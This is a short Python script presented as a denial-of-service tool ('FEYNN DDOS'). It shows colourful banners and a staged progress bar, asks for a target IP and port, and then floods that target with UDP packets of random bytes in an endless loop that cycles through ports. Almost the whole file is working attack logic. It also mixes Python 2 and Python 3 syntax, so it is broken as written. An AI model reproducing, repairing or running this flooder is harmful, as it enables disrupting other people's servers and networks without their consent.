print ("\033[34m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random.getrandbits(1490)
#############

os.system("clear")
os.system("figlet FEYNN")
print("""
 _____________________________________________
|                  FEYNN DDOS                 |
|           Version : miss na kita :(         |
|_____________________________________________|
""")
print
print "Ma priso nako gaw :c"
print
ip = input("IP Target: ")
port = int(input("Port: "))
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("FEYNN FEYNN FEYNN FEYNNN")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes.to_bytes((bytes.bit_length() + 7) // 8, 'big'), (ip,port)) 
     sent += 1
     port += 1
     print(f"Sent {sent} packets to {ip} throught port: {port}")
     if port == 65534:
        port = 1

